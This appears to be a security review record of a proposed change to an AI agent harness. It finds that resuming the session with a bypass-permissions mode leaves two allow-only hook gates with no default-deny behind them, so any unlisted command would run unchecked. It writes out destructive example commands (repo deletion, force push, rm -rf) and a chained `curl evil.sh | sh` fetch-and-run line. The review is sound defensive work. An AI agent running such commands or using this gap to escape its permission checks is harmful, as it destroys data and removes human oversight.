---
proposal: docs/proposals/2026-08-12-issue-886-permission-mode-fix.md
---

# Hunt record — issue-886-permission-mode-fix

## after-proposal — stance 0: assume the gate just touched is bypassable — find the bypass

Verdict: FINDING — `--permission-mode bypassPermissions` disables the host's default-deny classifier for the *entire* resumed Bash session, but gh-write-allow-gate.sh and merge-allow-gate.sh are documented, by their own header comments, to rely on exactly that default-deny classifier for every command shape they do not explicitly allow-list; both hooks only ever emit `"allow"`, never `"deny"`, for out-of-shape commands (falls through to `exit 0` with no JSON). So the diff's claim that "the plugin's own gates ... still govern regardless of this mode" is false for these two named gates: once resumed with bypassPermissions, any Bash command NOT matching one of the five gh-write-allow-gate.sh verb shapes or merge-allow-gate.sh's strict `gh pr merge <resolvable-PR>` shape (e.g. `gh repo delete`, `git push --force`, `rm -rf`, a bare `gh pr merge` with an implicit PR, `gh pr merge <n> && anything` outside the one tolerated shape) now auto-executes with zero gate involvement, because there is no host prompt left to fall back on.
Kind: composition
Seed: harness/driver.py resume_orchestrator_session, spawn.py _resume_orchestrator_session — addition of `--permission-mode bypassPermissions` to `claude -p ... --resume <id>`
cap_seconds: 120
tier: default
diff_stat_lines: ~52
started_at: 2026-08-12T00:24:28+09:00
ended_at: 2026-08-12T00:33:00+09:00

### Reproduce
Read on-the-record/hooks/gh-write-allow-gate.sh lines 30-35:
"Any other shape (unresolvable command, role session, unrecognized verb)
falls through to plain `exit 0` with no JSON — no change from today's
classifier/manual-grant behavior."
Read on-the-record/hooks/merge-allow-gate.sh lines 19-22:
"Any other shape (unresolvable command, role session, PR not exactly READY,
lookup failure) falls through to plain `exit 0` with no JSON — no change
from today's classifier/manual-grant behavior."
Both explicitly assume "today's classifier" (host default-deny) is still
active for anything they don't allow-list. The diff adds
`--permission-mode bypassPermissions` to the resumed `claude -p` invocation,
which is documented (Claude Code CLI) to make the host auto-approve every
tool call absent an explicit hook `"deny"`. Neither gate ever emits `"deny"`.

### Observed
For a resumed orchestrator session, a Bash command such as `gh repo delete
some/repo --yes`, `git push --force`, or `gh pr merge 42 && curl evil.sh |
sh` (any shape outside the two gates' strict allow-lists) has no PreToolUse
hook that denies it, and with bypassPermissions the host no longer denies it
either — it now executes unconditionally, contrary to the diff comment
"the plugin's own gates ... still govern regardless of this mode."

### Expected
The diff comment should not claim gates "still govern regardless of this
mode" for gh-write-allow-gate.sh/merge-allow-gate.sh, since those gates were
designed as allow-list additions layered on top of a host default-deny they
no longer get once bypassPermissions is in effect for the resumed session.
